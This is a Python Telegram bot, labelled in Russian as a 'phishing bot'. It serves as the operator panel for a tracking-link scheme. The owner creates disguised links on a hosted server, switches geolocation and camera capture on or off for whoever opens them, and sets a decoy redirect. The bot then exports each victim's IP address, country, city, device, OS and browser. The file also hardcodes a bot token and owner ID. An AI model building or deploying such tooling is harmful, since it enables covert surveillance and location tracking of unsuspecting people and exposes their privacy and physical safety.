#!/usr/bin/env python3
# -*- coding: utf-8 -*-

import os
import json
import uuid
import time
import asyncio
from datetime import datetime
from aiogram import Bot, Dispatcher, types
from aiogram.filters import CommandStart
from aiogram.types import InlineKeyboardMarkup, InlineKeyboardButton, FSInputFile
from aiogram.enums import ParseMode
from aiogram.fsm.storage.memory import MemoryStorage

# ============ КОНФИГ ============
OWNER_ID = 744709325  # ТВОЙ ID
BOT_TOKEN = "8988753811:AAGCcjuqQT-m0broYRfqY3NENTpXx7jSyvg"
BASE_URL = "https://okak-4u9q.onrender.com/"

FISHING_DATA_FOLDER = "fishing_data"
os.makedirs(FISHING_DATA_FOLDER, exist_ok=True)

# ============ РАБОТА С ДАННЫМИ ============
def load_data():
    path = os.path.join(FISHING_DATA_FOLDER, f"owner_{OWNER_ID}.json")
    if os.path.exists(path):
        try:
            with open(path, 'r', encoding='utf-8') as f:
                return json.load(f)
        except:
            return {}
    return {}

def save_data(data):
    path = os.path.join(FISHING_DATA_FOLDER, f"owner_{OWNER_ID}.json")
    with open(path, 'w', encoding='utf-8') as f:
        json.dump(data, f, ensure_ascii=False, indent=2)

def get_settings():
    data = load_data()
    return data.get('settings', {
        'redirect': 'https://vk.com/',
        'geo': True,
        'camera': True,
        'links': {}
    })

def save_settings(settings):
    data = load_data()
    data['settings'] = settings
    save_data(data)

def generate_link():
    settings = get_settings()
    link_id = str(uuid.uuid4())[:8]
    settings['links'][link_id] = {
        'created': datetime.now().strftime('%Y-%m-%d %H:%M:%S'),
        'visits': []
    }
    save_settings(settings)
    return link_id

def delete_link(link_id):
    settings = get_settings()
    if link_id in settings.get('links', {}):
        del settings['links'][link_id]
        save_settings(settings)
        return True
    return False

def get_links():
    settings = get_settings()
    return settings.get('links', {})

# ============ КЛАВИАТУРЫ ============
def main_kb():
    return InlineKeyboardMarkup(inline_keyboard=[
        [InlineKeyboardButton(text="⚙️ Настройки", callback_data="settings")],
        [InlineKeyboardButton(text="🔗 Создать ссылку", callback_data="create")],
        [InlineKeyboardButton(text="📋 Мои ссылки", callback_data="links")],
        [InlineKeyboardButton(text="📊 Статистика", callback_data="stats")]
    ])

def settings_kb():
    s = get_settings()
    return InlineKeyboardMarkup(inline_keyboard=[
        [InlineKeyboardButton(text=f"📍 Гео: {'✅' if s.get('geo', True) else '❌'}", callback_data="tgeo")],
        [InlineKeyboardButton(text=f"📷 Камера: {'✅' if s.get('camera', True) else '❌'}", callback_data="tcam")],
        [InlineKeyboardButton(text="🔗 Редирект", callback_data="redir")],
        [InlineKeyboardButton(text="🔙 Назад", callback_data="back")]
    ])

def links_kb(links):
    buttons = []
    for lid in links:
        v = len(links[lid].get('visits', []))
        buttons.append([InlineKeyboardButton(text=f"🔗 {lid} ({v})", callback_data=f"link_{lid}")])
    buttons.append([InlineKeyboardButton(text="🔙 Назад", callback_data="back")])
    return InlineKeyboardMarkup(inline_keyboard=buttons)

def link_menu_kb(link_id):
    return InlineKeyboardMarkup(inline_keyboard=[
        [InlineKeyboardButton(text="📋 Копировать", callback_data=f"copy_{link_id}")],
        [InlineKeyboardButton(text="📊 Данные", callback_data=f"data_{link_id}")],
        [InlineKeyboardButton(text="🗑️ Удалить", callback_data=f"del_{link_id}")],
        [InlineKeyboardButton(text="🔙 Назад", callback_data="backlinks")]
    ])

def back_kb():
    return InlineKeyboardMarkup(inline_keyboard=[
        [InlineKeyboardButton(text="🔙 Назад", callback_data="back")]
    ])

# ============ БОТ ============
bot = Bot(token=BOT_TOKEN)
dp = Dispatcher(storage=MemoryStorage())
waiting_redirect = {}

# ============ ОБРАБОТЧИКИ ============
@dp.message(CommandStart())
async def start_cmd(msg: types.Message):
    if msg.from_user.id != OWNER_ID:
        await msg.answer("⚠️ Доступ запрещён! Только создатель может использовать этого бота.")
        return
    await msg.answer("🎣 Фишинг бот\n\nСоздавай ссылки и собирай данные!", reply_markup=main_kb())

@dp.callback_query(lambda c: c.data == "settings")
async def settings_cb(call: types.CallbackQuery):
    if call.from_user.id != OWNER_ID:
        return await call.answer("❌", True)
    s = get_settings()
    txt = f"⚙️ Настройки\n\n📍 Гео: {'✅' if s.get('geo') else '❌'}\n📷 Камера: {'✅' if s.get('camera') else '❌'}\n🔗 Редирект: {s.get('redirect')}"
    await call.message.edit_text(txt, reply_markup=settings_kb())

@dp.callback_query(lambda c: c.data == "tgeo")
async def tgeo_cb(call: types.CallbackQuery):
    if call.from_user.id != OWNER_ID:
        return await call.answer("❌", True)
    s = get_settings()
    s['geo'] = not s.get('geo', True)
    save_settings(s)
    await settings_cb(call)

@dp.callback_query(lambda c: c.data == "tcam")
async def tcam_cb(call: types.CallbackQuery):
    if call.from_user.id != OWNER_ID:
        return await call.answer("❌", True)
    s = get_settings()
    s['camera'] = not s.get('camera', True)
    save_settings(s)
    await settings_cb(call)

@dp.callback_query(lambda c: c.data == "redir")
async def redir_cb(call: types.CallbackQuery):
    if call.from_user.id != OWNER_ID:
        return await call.answer("❌", True)
    waiting_redirect[OWNER_ID] = True
    await call.message.edit_text("🔗 Введи URL для редиректа (пример: https://vk.com/)", reply_markup=back_kb())

@dp.message(lambda m: waiting_redirect.get(m.from_user.id))
async def redir_input(msg: types.Message):
    if msg.from_user.id != OWNER_ID:
        return
    url = msg.text.strip()
    if not url.startswith(('http://', 'https://')):
        return await msg.answer("❌ Неверный формат! Нужно http:// или https://")
    s = get_settings()
    s['redirect'] = url
    save_settings(s)
    waiting_redirect.pop(OWNER_ID, None)
    await msg.answer(f"✅ Редирект: {url}", reply_markup=main_kb())

@dp.callback_query(lambda c: c.data == "create")
async def create_cb(call: types.CallbackQuery):
    if call.from_user.id != OWNER_ID:
        return await call.answer("❌", True)
    lid = generate_link()
    url = f"{BASE_URL}l/{lid}"
    s = get_settings()
    await call.message.edit_text(
        f"✅ Ссылка создана!\n\n🔗 {url}\n\n"
        f"📍 Гео: {'✅' if s.get('geo') else '❌'}\n"
        f"📷 Камера: {'✅' if s.get('camera') else '❌'}\n"
        f"🔗 Редирект: {s.get('redirect')}",
        reply_markup=InlineKeyboardMarkup(inline_keyboard=[
            [InlineKeyboardButton(text="📋 Копировать", callback_data=f"copy_{lid}")],
            [InlineKeyboardButton(text="🔙 Назад", callback_data="back")]
        ])
    )

@dp.callback_query(lambda c: c.data == "links")
async def links_cb(call: types.CallbackQuery):
    if call.from_user.id != OWNER_ID:
        return await call.answer("❌", True)
    links = get_links()
    if not links:
        return await call.message.edit_text("📋 Нет созданных ссылок", reply_markup=back_kb())
    txt = f"📋 Мои ссылки ({len(links)})\n\n"
    for lid, d in links.items():
        txt += f"🔗 {lid}: {len(d.get('visits', []))} переходов\n"
    await call.message.edit_text(txt, reply_markup=links_kb(links))

@dp.callback_query(lambda c: c.data.startswith("link_"))
async def link_cb(call: types.CallbackQuery):
    if call.from_user.id != OWNER_ID:
        return await call.answer("❌", True)
    lid = call.data.split("_")[1]
    links = get_links()
    v = len(links.get(lid, {}).get('visits', []))
    await call.message.edit_text(
        f"🔗 Ссылка: {lid}\n\n👥 Переходов: {v}\n🔗 URL: {BASE_URL}l/{lid}",
        reply_markup=link_menu_kb(lid)
    )

@dp.callback_query(lambda c: c.data.startswith("copy_"))
async def copy_cb(call: types.CallbackQuery):
    if call.from_user.id != OWNER_ID:
        return await call.answer("❌", True)
    lid = call.data.split("_")[1]
    await call.message.answer(f"📋 {BASE_URL}l/{lid}")

@dp.callback_query(lambda c: c.data.startswith("data_"))
async def data_cb(call: types.CallbackQuery):
    if call.from_user.id != OWNER_ID:
        return await call.answer("❌", True)
    lid = call.data.split("_")[1]
    links = get_links()
    visits = links.get(lid, {}).get('visits', [])
    if not visits:
        return await call.answer("📊 Нет данных", True)
    
    fn = f"data_{lid}_{int(time.time())}.txt"
    with open(fn, 'w', encoding='utf-8') as f:
        f.write(f"Данные ссылки: {lid}\n")
        f.write("=" * 50 + "\n\n")
        f.write(f"Всего переходов: {len(visits)}\n\n")
        for i, v in enumerate(visits, 1):
            f.write(f"--- Переход {i} ---\n")
            f.write(f"Время: {v.get('timestamp', 'Unknown')}\n")
            f.write(f"IP: {v.get('ip', 'Unknown')}\n")
            f.write(f"Страна: {v.get('country', 'Unknown')}\n")
            f.write(f"Город: {v.get('city', 'Unknown')}\n")
            f.write(f"Устройство: {v.get('device_type', 'Unknown')}\n")
            f.write(f"ОС: {v.get('os', 'Unknown')}\n")
            f.write(f"Браузер: {v.get('browser', 'Unknown')}\n")
            f.write("\n")
    
    await call.message.answer_document(FSInputFile(fn), caption=f"📊 Данные {lid}")
    os.remove(fn)

@dp.callback_query(lambda c: c.data.startswith("del_"))
async def del_cb(call: types.CallbackQuery):
    if call.from_user.id != OWNER_ID:
        return await call.answer("❌", True)
    lid = call.data.split("_")[1]
    if delete_link(lid):
        await call.answer("✅ Удалено", True)
        await links_cb(call)

@dp.callback_query(lambda c: c.data == "stats")
async def stats_cb(call: types.CallbackQuery):
    if call.from_user.id != OWNER_ID:
        return await call.answer("❌", True)
    links = get_links()
    total = sum(len(l.get('visits', [])) for l in links.values())
    await call.message.edit_text(
        f"📊 Статистика\n\n"
        f"📌 Всего ссылок: {len(links)}\n"
        f"👥 Всего переходов: {total}",
        reply_markup=back_kb()
    )

@dp.callback_query(lambda c: c.data == "backlinks")
async def backlinks_cb(call: types.CallbackQuery):
    await links_cb(call)

@dp.callback_query(lambda c: c.data == "back")
async def back_cb(call: types.CallbackQuery):
    if call.from_user.id != OWNER_ID:
        return await call.answer("❌", True)
    waiting_redirect.pop(OWNER_ID, None)
    await call.message.edit_text("🎣 Фишинг бот\n\nСоздавай ссылки и собирай данные!", reply_markup=main_kb())

# ============ ЗАПУСК ============
if __name__ == "__main__":
    print("🚀 ЗАПУСК ФИШИНГ БОТА")
    print(f"👤 Владелец: {OWNER_ID}")
    print(f"🌐 Базовый URL: {BASE_URL}")
    print("=" * 40)
    asyncio.run(dp.start_polling(bot))